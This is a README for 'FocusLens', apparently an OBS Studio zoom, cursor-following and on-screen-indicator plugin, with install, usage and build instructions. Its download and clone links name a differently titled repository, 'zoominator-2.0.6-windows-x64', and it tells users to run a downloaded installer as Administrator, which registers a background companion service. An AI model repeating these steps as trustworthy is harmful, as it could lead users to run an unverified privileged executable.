# FocusLens for OBS Studio

[![Platform](https://img.shields.io/badge/platform-Windows%2064--bit-blue.svg)](https://github.com/)
[![OBS Studio](https://img.shields.io/badge/OBS%20Studio-28.0%2B-black.svg?logo=obsstudio)](https://obsproject.com/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Release](https://img.shields.io/badge/version-2.1.0-brightgreen.svg)](https://github.com/)

FocusLens is a screen zoom, cursor-following, and on-screen display (OSD) suite for OBS Studio. It is built for content creators, tutorial makers, educators, and streamers who need to highlight details without complicated scene switching.

---

## Overview

When presenting tutorials, code walkthroughs, webinars, or demonstrations in OBS Studio, viewers often struggle to read small text and user interface details.

FocusLens enables dynamic magnification directly inside OBS Studio. It features automated mouse tracking, cursor click halo effects, and an isolated stealth OSD indicator that informs you when zoom is active without appearing on your stream or recording output.

---

## Visual Walkthrough

### 1. Opening the Plugin
<p align="center"><img src="screenshots/screenshot1.png" alt="Opening FocusLens" width="700" /></p>
<p align="center"><em>Access FocusLens from the <b>Tools</b> menu in OBS Studio.</em></p>

### 2. Configuring Triggers
<p align="center"><img src="screenshots/screenshot2.png" alt="Trigger Settings" width="700" /></p>
<p align="center"><em>Configure hotkeys or mouse button combinations to trigger magnification.</em></p>

### 3. Adjusting Zoom Behavior
<p align="center"><img src="screenshots/screenshot3.png" alt="Zoom Behavior" width="700" /></p>
<p align="center"><em>Configure zoom factor, follow speed, and toggle vs. hold mode.</em></p>

### 4. Selecting Sources
<p align="center"><img src="screenshots/screenshot4.png" alt="Source Selection" width="700" /></p>
<p align="center"><em>Choose which sources are magnified (e.g., Desktop Capture) and leave overlays untouched.</em></p>

### 5. OSD Alert Badge
<p align="center"><img src="screenshots/screenshot5.png" alt="OSD Badge" width="700" /></p>
<p align="center"><em>Stealth "ZOOM ACTIVE" indicator appears on screen, isolated from stream capture.</em></p>

### 6. System Tray Companion
<p align="center"><img src="screenshots/screenshot6.png" alt="System Tray Menu" width="700" /></p>
<p align="center"><em>Manage alerts, sync zoom state, or exit via the system tray icon.</em></p>

---

## Features

- **Dynamic Screen Zoom:** Zoom in and out with configurable transitions using hotkeys or mouse clicks (e.g., `Ctrl + Left Click`).
- **Cursor Tracking:** The viewport follows mouse movements naturally while zoomed in.
- **Click Highlight Halo:** Highlights mouse clicks with an animated halo for tutorial visibility.
- **Stealth OSD Indicator:** Displays an on-screen alert so you know magnification is active. Protected with `WDA_EXCLUDEFROMCAPTURE` so it is excluded from your OBS video feed and recordings.
- **Background Sync:** Automatically attaches when OBS Studio is running and stays idle when OBS is closed.
- **Self-Contained Installer:** Packaged as a single standalone executable (`FocusLensInstaller.exe`) that configures the plugin and companion service automatically.

---

## Installation

1. Go to the [Releases](https://github.com/saifulislammz/zoominator-2.0.6-windows-x64/releases) page.
2. Download `FocusLensInstaller.exe`.
3. Run the installer as Administrator. It will automatically detect your OBS Studio installation path, install the plugin binaries, and register the companion utility.
4. Launch OBS Studio.

---

## Usage Guide

### 1. Settings Menu
Open OBS Studio and select **Tools** -> **FocusLens...** from the top menu bar.

### 2. Setting Trigger Keys
In the **Trigger** tab:
- **Keyboard Trigger:** Set a preferred hotkey (such as `F10`).
- **Mouse Button Trigger:** Select `Left`, `Right`, or `Middle` mouse button.
- **Modifiers:** Select `Ctrl`, `Alt`, or `Shift`.
  - Common recommendation: `Ctrl` + `Left Click` to zoom straight into cursor position.

### 3. Tuning Zoom Settings
In the **Target / Advanced** tab:
- **Mode:**
  - *Hold Mode:* Zooms while holding down the trigger; resets on release.
  - *Toggle Mode:* Press once to zoom in, press again to zoom out.
- **Zoom Factor:** Set magnification level (e.g., 2.0x).
- **Mouse Follow Sensitivity:** Adjust cursor tracking smoothness and speed.

### 4. Source Filtering
In the **Sources** tab:
- Enable zoom on display capture or window capture sources.
- Keep webcams, alerts, and overlay borders unchecked to preserve their positioning.

### 5. Companion Status
- A red tray icon indicates the companion alert system is running.
- Right-click the icon to toggle alert visibility or force a state resync.

---

## Building from Source

To compile the installer and companion app manually:

```powershell
# Clone the repository
git clone https://github.com/saifulislammz/zoominator-2.0.6-windows-x64.git
cd zoominator-2.0.6-windows-x64

# Compile companion OSD service
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:winexe /out:FocusLensOSD.exe /reference:System.Windows.Forms.dll /reference:System.Drawing.dll src/FocusLensOSD.cs

# Compile installer
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:FocusLensInstaller.exe src/FocusLensInstaller.cs
```

---

## System Requirements

- **OS:** Windows 10 or Windows 11 (64-bit)
- **OBS Studio:** Version 28.0 or newer (64-bit)
- **Runtime:** .NET Framework 4.5 or higher (included by default on Windows 10/11)

---

## License

Distributed under the MIT License. See [LICENSE](LICENSE) for details.

---

## Author

**Saiful Islam**
- Website: [saifulislam.net](https://saifulislam.net)
- GitHub: [@saifulislammz](https://github.com/saifulislammz)
